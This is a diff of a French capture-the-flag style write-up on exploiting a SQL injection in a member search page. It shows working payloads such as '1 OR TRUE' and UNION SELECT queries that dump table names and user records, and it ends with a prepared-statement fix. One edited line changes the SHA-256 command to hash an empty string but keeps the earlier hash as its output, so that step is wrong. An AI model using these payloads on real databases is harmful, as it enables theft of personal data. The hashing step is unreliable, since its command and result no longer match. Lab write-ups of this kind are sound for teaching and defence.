@@ -5,6 +5,7 @@
 L’injection SQL est une faille de sécurité qui me permet, en tant qu'attaquant, d'exécuter des requêtes SQL arbitraires sur une base de données en manipulant les entrées utilisateur d'une application web mal sécurisée. Cette vulnérabilité me donne la possibilité d'accéder, modifier ou supprimer des données sensibles.
 
 Dans ce document, je vais détailler comment j'ai découvert et exploité une injection SQL dans un moteur de recherche d'utilisateurs accessible via l’URL suivante :
+
 ```bash
 http://IP/?page=member
 ```
@@ -18,11 +19,13 @@ L'application contient un moteur de recherche permettant d’afficher des inform
 - **Input** : `1`
 
 - **Requête exécutée par le serveur** :
+
 ```bash
 SELECT first_name, surname FROM users WHERE users.id = 1;
 ```
 
 - **Output** :
+
 ```bash
 ID: 1
 First name: one
@@ -38,6 +41,7 @@ J'ai testé une tentative simple d'injection SQL en soumettant une requête non 
 - **Input** : `SELECT * FROM users`
 
 - **Output** :
+
 ```
 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version...
 ```
@@ -55,11 +59,13 @@ En injectant une condition toujours vraie (`OR TRUE`), je peux récupérer tous 
 - **Input** : `1 OR TRUE`
 
 - **Requête exécutée** :
+
 ```
 SELECT first_name, surname FROM users WHERE users.id = 1 OR TRUE;
 ```
 
 - **Output** :
+
 ```bash
 ID: 1 OR TRUE
 First name: one
@@ -85,6 +91,7 @@ J'ai ensuite tenté une attaque `UNION SELECT` pour récupérer les noms des col
 - **Input** : `-1 UNION SELECT table_name, column_name FROM information_schema.columns`
 
 - **Output** :
+
 ```bash
 First name: users
 Surname : user_id
@@ -103,6 +110,7 @@ J'ai concaténé toutes les colonnes d’un utilisateur pour voir son contenu :
 - **Input** : `-1 UNION SELECT CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign), 1 FROM users`
 
 - **Output** :
+
 ```bash
 First name: 5FlagGetThe424242Decrypt this password -> then lower all the char. Sha256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
 ```
@@ -119,9 +127,10 @@ Le message indique une opération de hachage SHA-256 après conversion en minusc
 
 - **Conversion en minuscules** : `fortytwo`
 
-- **Hachage SHA-256** : 
+- **Hachage SHA-256** :
+
 ```bash
-echo -n "fortytwo" | sha256sum
+echo -n "" | sha256sum
 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 ```
 
@@ -130,6 +139,7 @@ echo -n "fortytwo" | sha256sum
 ### 4.1 Utilisation des requêtes préparées
 
 Les requêtes préparées empêchent l’injection SQL en séparant la logique SQL des entrées utilisateur :
+
 ```bash
 $stmt = $pdo->prepare("SELECT first_name, surname FROM users WHERE users.id = :id");
 $stmt->execute(['id' => $_GET['id']]);
